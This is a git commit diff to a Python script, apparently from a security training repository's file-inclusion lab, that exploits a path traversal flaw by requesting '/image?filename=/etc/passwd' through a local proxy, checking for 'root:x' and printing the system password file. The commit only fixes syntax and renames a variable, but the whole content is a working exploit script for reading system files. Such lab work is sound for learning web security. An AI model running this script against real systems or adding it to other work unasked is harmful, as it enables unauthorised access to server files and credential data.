c0819018cf7a880a02832cb28ece1803e160a228
Jozenartes <jozenarts12@gmail.com>
2025-07-24 11:26:01 +0100

    updated exploit function

--- 06-File Inclusion/Lab-02/Directory-traveseral-lab02.py
+++ 06-File Inclusion/Lab-02/Directory-traveseral-lab02.py
@@ -6,16 +6,16 @@ urllib3.disable_warnings(urllib3.exceptions.SecurityWarning)
 proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 
 def path_traversal_exploit(url):
-    url = url + '/image?filename=/etc/passwd'
-    r = requests.get(url, verify=False,proxies=proxies)
+    image_path = url + '/image?filename=/etc/passwd'
+    r = requests.get(image_path, verify=False,proxies=proxies)
 #Confirm the success of the exploit
     if 'root:x' in r.text:
         print('[+] Exploit Succesful')
-        print('[+] Here\'s the content of the etc/passwd file:')
+        print('[+] Here\'s the content of the etc/passwd file: \n')
         print(r.text)
     else:
         print('[-] Exploit unsuccesful')
-        sys.exit[-1]
+        sys.exit(-1)
 
 #function to print instrucitons if the program is incorrectly
 def main():
@@ -23,7 +23,7 @@ def main():
         print('[-] OOPS!')
         print('[+] Usage: %s <url>' % sys.argv[0])
         print('[+] Example: %s www.example.com' % sys.argv[0])
-        sys.exit[-1]
+        sys.exit(-1)
 #after running the program correctly
     url = sys.argv[1]
     print('[+] Exploiting the path traversal vulnerability')
